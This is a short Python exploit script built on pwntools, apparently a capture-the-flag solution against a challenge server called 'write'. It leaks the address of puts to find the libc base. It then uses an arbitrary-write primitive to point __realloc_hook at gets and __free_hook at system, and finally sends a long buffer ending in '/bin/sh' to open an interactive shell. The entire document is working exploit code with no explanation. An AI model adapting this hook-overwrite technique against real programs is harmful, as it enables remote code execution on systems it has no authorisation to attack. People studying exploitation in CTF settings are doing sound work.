#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

#r = process('./write')
r = remote('pwn.byteband.it', 9000)
libc = ELF('./libc-2.27.so')

r.recvuntil('puts: ')
puts = int(r.recvline(), 16)

libc.address = puts - libc.symbols['puts']

r.sendlineafter('(q)uit\n', 'w')
r.sendlineafter('ptr: ', str(libc.symbols['__realloc_hook']))
r.sendlineafter('val: ', str(libc.symbols['gets']))
r.sendlineafter('(q)uit\n', 'w')
r.sendlineafter('ptr: ', str(libc.symbols['__free_hook']))
r.sendlineafter('val: ', str(libc.symbols['system']))
r.sendlineafter('(q)uit\n', 'w')
r.sendlineafter('ptr: ', '2'*2049 + '/bin/sh\n')

r.interactive()
